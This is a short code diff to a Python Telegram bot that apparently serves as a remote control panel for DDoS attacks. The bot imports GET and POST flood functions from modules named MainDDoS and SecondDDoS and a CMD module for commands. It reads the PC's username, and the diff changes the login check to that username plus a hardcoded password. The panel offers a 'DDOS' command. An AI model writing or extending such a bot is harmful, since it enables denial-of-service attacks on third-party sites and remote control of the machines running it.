@@ -1,15 +1,15 @@
 import telebot
 from getpass import getuser
-import config
 import os
 from dbworker import set_state, get_current_state
 from MainDDoS import mainDDoS, GETDDOS1, GETDDOS2, POSTDDOS1, POSTDDOS2, POSTDDOS3
 from SecondDDoS import secondDDoS, sGETDDOS1, sGETDDOS2, sPOSTDDOS1, sPOSTDDOS2, sPOSTDDOS3
 from CMD import cmd
+import config
 
 client = telebot.TeleBot(config.config["token"])
 
-name = getuser() # Name = name of your PC
+name = getuser()
 
 @client.message_handler(commands=["start"])
 def login(message):
@@ -18,7 +18,7 @@ def login(message):
 
 @client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_LOGIN)
 def login_in(message):
-    if message.text == "1":
+    if message.text == name + " 16080305":
         client.send_message(message.chat.id, 'Logged in - ' + name + ' as Administrator')
         client.send_message(message.chat.id, "Commands: ")
         client.send_message(message.chat.id, 'DDOS - enter in DDoS panel')
